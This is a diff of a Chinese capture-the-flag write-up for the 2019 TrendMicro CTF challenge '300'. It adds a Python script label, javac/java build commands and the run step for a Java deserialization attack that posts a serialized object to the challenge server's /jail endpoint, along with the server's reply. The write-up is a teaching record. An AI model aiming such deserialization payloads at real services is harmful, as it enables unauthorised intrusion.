@@ -1,3 +1,7 @@
+# 300
+
+[English Version](https://balsn.tw/ctf_writeup/20190913-trendmicroctf/#300)
+
 unzip war包，然後decompile class，得到關鍵源碼:
 
 Person.java:
@@ -225,6 +229,8 @@ class Person implements Serializable {
 }
 ```
 
+a.py:
+
 ```python
 import requests
 
@@ -233,6 +239,12 @@ with open("name.ser") as f:
 r = requests.post("http://flagmarshal.xyz/jail", data=x, headers={'Content-Type': 'application/x-www-form-urlencoded'})
 print r.text
 ```
+
+`javac -d . *.java`
+
+`java com.trendmicro.SerializeTest`
+
+`python a.py`
 
 => `Sorry Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain. I cannot let you have the Flag!.`
 
